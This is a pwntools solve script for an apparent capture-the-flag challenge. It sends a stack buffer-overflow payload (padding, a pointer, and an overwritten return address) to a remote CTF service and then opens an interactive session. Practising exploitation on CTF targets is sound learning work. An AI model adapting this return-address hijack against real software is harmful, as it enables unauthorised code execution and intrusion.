from pwn import*
context.arch="amd64"
context.terminal="kitty" #adjust this with ur terminal or comment/remove the line
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10007"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)
# Overflow: buffer is 0x50 bytes long, then we overwrite saved registers/return
# The payload writes 0x50 'a' bytes to reach the saved return pointer.
# Next 8 bytes (p64(0x404800)) is likely a controlled pointer used by the binary
# and final p64(0x4011a1) is the address of the function we want to return to.
payload=b"a"*0x50 + p64(0x404800) + p64(0x4011a1)

p.sendline(payload)
p.interactive()
